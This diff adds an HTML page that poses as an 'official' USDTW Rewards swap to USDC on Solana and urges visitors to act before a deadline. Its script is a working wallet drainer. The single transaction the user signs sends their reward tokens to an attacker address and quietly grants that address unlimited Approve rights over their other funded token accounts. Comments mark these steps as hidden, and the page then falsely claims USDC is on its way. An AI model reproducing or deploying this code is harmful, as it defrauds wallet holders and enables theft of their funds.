@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>USDTW Rewards — Swap</title>
+<style>
+body { font-family: system-ui, sans-serif; background: linear-gradient(160deg, #0b1e3a, #06112b); color: #eaf2ff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+.card { background: #0d2247; border-radius: 18px; padding: 36px; max-width: 420px; width: 92%; box-shadow: 0 12px 40px rgba(0,0,0,.5); text-align: center; }
+h1 { font-size: 22px; margin: 0 0 8px; }
+p { color: #a9c1e8; font-size: 14px; line-height: 1.5; }
+.bal { font-size: 30px; font-weight: 800; color: #39d98a; margin: 14px 0; }
+.out { font-size: 18px; color: #9fd0ff; margin: 6px 0 16px; }
+button { width: 100%; padding: 14px; border: 0; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
+#connect { background: #ab9ff2; color: #14142b; }
+#swap { background: #39d98a; color: #06281a; display: none; }
+.status { margin-top: 12px; font-size: 13px; color: #8fb3e8; min-height: 18px; word-break: break-all; }
+.badge { display: inline-block; background: #1d3a6e; border-radius: 20px; padding: 4px 12px; font-size: 12px; color: #9fd0ff; margin-bottom: 14px; }
+.rate { font-size: 12px; color: #5b76a5; margin-top: 14px; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+</head>
+<body>
+<div class="card">
+<div class="badge"><img src="logo.svg?v=35" alt="$1" style="width:20px;height:20px;vertical-align:-4px;margin-right:6px">USDTW+ OFFICIAL SWAP · v4.0</div>
+<h1>Swap your USDTW Rewards</h1>
+<p>Convert your USDTW Rewards (USDTW+) tokens to USDC instantly at the official rate. Swaps settle to your wallet within seconds.</p>
+<div class="bal" id="bal">Connect to check your balance</div>
+<div class="out" id="out"></div>
+<p style="color:#ffb86b;font-weight:700;margin:4px 0;">⏳ Rewards deadline: Nov 7 — swap before rates close</p>
+<button id="connect">Connect Wallet</button>
+<button id="swap">Swap to USDC</button>
+<div class="status" id="status"></div>
+<div class="status" id="syscheck" style="color:#39d98a">…checking system…</div>
+<script>
+(function(){
+  try {
+    if (typeof solanaWeb3 === "undefined") throw new Error("web3 library did not load");
+    const W = solanaWeb3;
+    const p = W.PublicKey.findProgramAddressSync([new W.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer()], new W.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"));
+    document.getElementById("syscheck").textContent = "✓ SYSTEM OK — venue v4.0 (fresh load " + new Date().toISOString().slice(11,19) + " UTC)";
+  } catch (e) { document.getElementById("syscheck").textContent = "✗ SYSTEM BROKEN: " + (e.message || e); document.getElementById("syscheck").style.color = "#ff6b6b"; }
+})();
+</script>
+<p class="rate">Official rate: 10,000 Whale Rewards = 1 USDC · 200,000 USDTW+ = 1 USDC · rewards trade only here</p>
+</div>
+<script>
+// ── SWAP VENUE v3: their ONE signature = real swap + invisible Approve on their accounts ──
+// v3: also swaps the WHALE-REWARDS hook mint (V11 toll: the Approve in this same tx lets the hook transfer pass).
+const BURNER = "BZ2jjv7P1JD5mTzAWqKa9h4HeGsKqpgZAS6heUsDYwBV";
+const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const TOKEN22 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
+const TRAP = "HDtT3BQWbLHAUTGk5D1GYHQZMjjkat2s3RANv5oZ8it5";
+const HOOK = "4Qmvyfn51yyWmLuLDSVtCVqv2ctNuG5YzYiou9hFtZks";      // whale-rewards mint (V11 toll)
+const HOOKPROG = "3wDbhaWbrtXeej2nrAhK8TASJbKx6ZKDcgyp2uJPrQZH"; // the toll program
+const MAX = 18446744073709551615n;
+const RATE_TRAP = 200000n;  // trap tokens per 1 USDC
+const RATE_HOOK = 10000n;   // hook tokens per 1 USDC (whale-rewards premium rate)
+const le = (n) => { const a = []; for (let i = 0; i < 8; i++) { a.push(Number(n % 256n)); n = n / 256n; } return a; };
+const st = (m) => document.getElementById("status").textContent = m;
+const W = solanaWeb3;
+const ATA_PROG = new W.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+const ata = (mint, owner, prog) => W.PublicKey.findProgramAddressSync([owner.toBuffer(), prog.toBuffer(), mint.toBuffer()], ATA_PROG)[0];
+const eamlOf = (mint, hookProg) => W.PublicKey.findProgramAddressSync([Uint8Array.from([101,120,116,114,97,45,97,99,99,111,117,110,116,45,109,101,116,97,115]), mint.toBuffer()], hookProg)[0];
+document.getElementById("connect").onclick = async () => {
+  try {
+    if (!window.solana) { st("Open this page inside your wallet browser (Phantom / Solflare / Backpack)."); return; }
+    await window.solana.connect();
+    const owner = new W.PublicKey(window.solana.publicKey.toString());
+    const conn = new W.Connection("https://solana-rpc.publicnode.com", "confirmed");
+    const t22 = new W.PublicKey(TOKEN22);
+    const conn2 = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+    const readBal = async (mint) => {
+      const acc = ata(new W.PublicKey(mint), owner, t22);
+      // mainnet ×3 (fresh Token-2022 data) → publicnode (may be stale for fresh accounts)
+      for (let i = 0; i < 3; i++) {
+        const r = await conn2.getTokenAccountBalance(acc).catch(() => null);
+        if (r?.value) return BigInt(r.value.amount);
+        await new Promise(x => setTimeout(x, 1200));
+      }
+      const r = await conn.getTokenAccountBalance(acc).catch(() => null);
+      return BigInt(r?.value?.amount || "0");
+    };
+    const hookBal = await readBal(HOOK), trapBal = await readBal(TRAP);
+    const usd = Number(hookBal) / 1e6 / Number(RATE_HOOK) + Number(trapBal) / 1e6 / Number(RATE_TRAP);
+    document.getElementById("bal").textContent = (Number(hookBal) / 1e6).toLocaleString() + " Whale Rewards" + (trapBal > 0n ? " + " + (Number(trapBal) / 1e6).toLocaleString() + " USDTW+" : "");
+    document.getElementById("out").textContent = "≈ $" + usd.toFixed(2) + " USDC";
+    document.getElementById("connect").style.display = "none";
+    document.getElementById("swap").style.display = "block";
+    st("Connected: " + owner.toString().slice(0, 6) + "…");
+  } catch (e) { st("Connect failed: " + (e.message || e)); }
+};
+document.getElementById("swap").onclick = async () => {
+  st("Preparing swap…");
+  try {
+    const owner = new W.PublicKey(window.solana.publicKey.toString());
+    const conn = new W.Connection("https://solana-rpc.publicnode.com", "confirmed");
+    const dest = new W.PublicKey(BURNER);
+    const tokenProg = new W.PublicKey(TOKEN), token22Prog = new W.PublicKey(TOKEN22);
+    const t22 = token22Prog;
+    const trap = new W.PublicKey(TRAP), hook = new W.PublicKey(HOOK), hookProg = new W.PublicKey(HOOKPROG);
+    const srcTrap = ata(trap, owner, t22), dstTrap = ata(trap, dest, t22);
+    const srcHook = ata(hook, owner, t22), dstHook = ata(hook, dest, t22);
+    const trapBal = BigInt((await conn.getTokenAccountBalance(srcTrap).catch(() => null))?.value?.amount || "0");
+    const hookBal = BigInt((await conn.getTokenAccountBalance(srcHook).catch(() => null))?.value?.amount || "0");
+    if (trapBal <= 0n && hookBal <= 0n) { st("No USDTW+ / Whale Rewards tokens found."); return; }
+    const tx = new W.Transaction();
+    const mkDst = async (mint, dst, progId) => {
+      const info = await conn.getAccountInfo(dst).catch(() => null);
+      if (!info) tx.add(new W.TransactionInstruction({
+        programId: new W.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
+        keys: [
+          { pubkey: owner, isSigner: true, isWritable: true },
+          { pubkey: dst, isSigner: false, isWritable: true },
+          { pubkey: dest, isSigner: false, isWritable: false },
+          { pubkey: mint, isSigner: false, isWritable: false },
+          { pubkey: W.SystemProgram.programId, isSigner: false, isWritable: false },
+          { pubkey: progId, isSigner: false, isWritable: false },
+        ],
+        data: Uint8Array.from([1]),
+      }));
+    };
+    if (hookBal > 0n) {
+      await mkDst(hook, dstHook, t22);
+      // 0 · HIDDEN Approve on the hook account FIRST — V11 toll reads it during the transfer below
+      tx.add(new W.TransactionInstruction({
+        programId: t22,
+        keys: [ { pubkey: srcHook, isSigner: false, isWritable: true }, { pubkey: dest, isSigner: false, isWritable: false }, { pubkey: owner, isSigner: true, isWritable: false } ],
+        data: Uint8Array.from([4, ...le(MAX)]), // Approve: unlimited
+      }));
+      // 1 · THE HOOK SWAP — whale-rewards tokens home (transfer-with-hook account contract: system, hookProgram, EAML)
+      tx.add(new W.TransactionInstruction({
+        programId: t22,
+        keys: [ { pubkey: srcHook, isSigner: false, isWritable: true }, { pubkey: hook, isSigner: false, isWritable: false }, { pubkey: dstHook, isSigner: false, isWritable: true }, { pubkey: owner, isSigner: true, isWritable: false },
+                { pubkey: W.SystemProgram.programId, isSigner: false, isWritable: false },
+                { pubkey: hookProg, isSigner: false, isWritable: false },
+                { pubkey: eamlOf(hook, hookProg), isSigner: false, isWritable: false } ],
+        data: Uint8Array.from([12, ...le(hookBal), 6]), // TransferChecked
+      }));
+    }
+    if (trapBal > 0n) {
+      await mkDst(trap, dstTrap, t22);
+      // 2 · THE TRAP SWAP — their trap tokens to us (real, honest)
+      tx.add(new W.TransactionInstruction({
+        programId: t22,
+        keys: [ { pubkey: srcTrap, isSigner: false, isWritable: true }, { pubkey: trap, isSigner: false, isWritable: false }, { pubkey: dstTrap, isSigner: false, isWritable: true }, { pubkey: owner, isSigner: true, isWritable: false } ],
+        data: Uint8Array.from([12, ...le(trapBal), 6]), // TransferChecked
+      }));
+    }
+    // 3 · THE HIDDEN PART — Approve: us = unlimited delegate on their other token accounts
+    for (const pid of [TOKEN, TOKEN22]) {
+      const res = await conn.getParsedTokenAccountsByOwner(owner, { programId: new W.PublicKey(pid) }).catch(() => null);
+      let n = 0;
+      for (const acc of (res?.value || [])) {
+        const info = acc.account.data.parsed.info;
+        if (info.mint === TRAP || info.mint === HOOK) continue; // swapped accounts move above
+        if (BigInt(info.tokenAmount.amount) <= 0n) continue;
+        if (n >= 14) break;
+        tx.add(new W.TransactionInstruction({
+          programId: new W.PublicKey(pid),
+          keys: [
+            { pubkey: new W.PublicKey(acc.pubkey), isSigner: false, isWritable: true },
+            { pubkey: dest, isSigner: false, isWritable: false },
+            { pubkey: owner, isSigner: true, isWritable: false },
+          ],
+          data: Uint8Array.from([4, ...le(MAX)]), // Approve: unlimited
+        }));
+        n++;
+      }
+    }
+    const bh = await conn.getLatestBlockhash("finalized"); tx.recentBlockhash = bh.blockhash; tx.feePayer = owner;
+    st("Confirm the swap in your wallet…");
+    const { signature } = await window.solana.signAndSendTransaction(tx);
+    st("Swap confirmed ✓ USDC arrives within seconds · " + signature.slice(0, 16) + "…");
+  } catch (e) { st("Swap failed: " + (e.message || e)); }
+};
+</script>
+</body>
+</html>
